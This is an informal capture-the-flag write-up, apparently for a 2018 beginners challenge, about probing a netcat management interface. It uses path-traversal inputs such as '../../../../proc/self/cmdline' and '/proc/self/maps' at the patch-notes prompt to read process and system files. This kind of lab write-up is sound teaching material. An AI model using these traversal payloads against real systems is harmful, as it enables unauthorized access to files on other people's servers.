# ADMIN UI


I'll built a shell script to connect with netcat to the given url, so execute:

```
sh connection.sh

>=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit

```

if you press 1) it asks you for a password, let's pass

```
if you press 2):

> The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
```
you have to Write correctly Version0.2 or Version0.3, in the case of you write something wrong, such as:

´´´
>The following patchnotes were found:
 22  - Version0.2
 23  - Version0.3
 24 Which patchnotes should be shown?

asd
>Error: No such file or directory
´´´

it seems to be a bash error (not a warning that the software throws), so it's trying to open a directory with that name

so let's try to see if we find something interesting in the files. in proc/self/cmdline we can see which command has be executed in this procedure. And do the same with maps.
```
 ../../../../proc/self/cmdline
> ./main

. . . 

../../../proc/self/maps

>00400000-00401000 r-xp 00000000 08:01 768497                             /home/user/main
41414000-41415000 r-xp 00014000 08:01 768497                             /home/user/main
41615000-41616000 r--p 00015000 08:01 768497                             /home/user/main
41616000-41617000 rw-p 00016000 08:01 768497                             /home/user/main
41c3d000-41c6f000 rw-p 00000000 00:00 0                                  [heap]
. . . 
```
I developed the script named connection.sh that looks the main folder and looks for something named flag or ctf

```
chmod +x connection.sh
./connection.sh

> flag
FLAG_FILE
_flags2
_flags
/usr/local/google/home/hamacher/stuff/2018-ctf-quals/2018-challenges-quals/beginners/pwn-re-mngmnt-iface/src
FLAG
_ZL9FLAG_FILE
_ZL4FLAG
```

so we will just have to see this folders.

